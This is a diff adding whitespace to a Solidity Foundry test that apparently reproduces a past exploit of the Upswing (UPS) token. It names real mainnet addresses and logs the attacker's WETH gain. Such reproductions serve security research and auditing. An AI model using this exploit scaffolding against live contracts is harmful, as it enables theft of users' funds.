@@ -17,10 +17,13 @@ import "./../interface.sol";
 // https://twitter.com/QuillAudits/status/1615634917802807297
 
 interface ITokenUPS is IERC20 {
+
     function myPressure(address _address) external view returns (uint256);
+
 }
 
 contract UpswingExploit is Test {
+
     Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
     IUniswapV2Pair lp = IUniswapV2Pair(0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34);
     address upsToken = 0x35a254223960c18B69C0526c46B013D022E93902;
@@ -68,4 +71,5 @@ contract UpswingExploit is Test {
             "After exploiting, Attacker WETH Balance", IERC20(weth).balanceOf(address(this)) - 1 ether, 18
         );
     }
+
 }
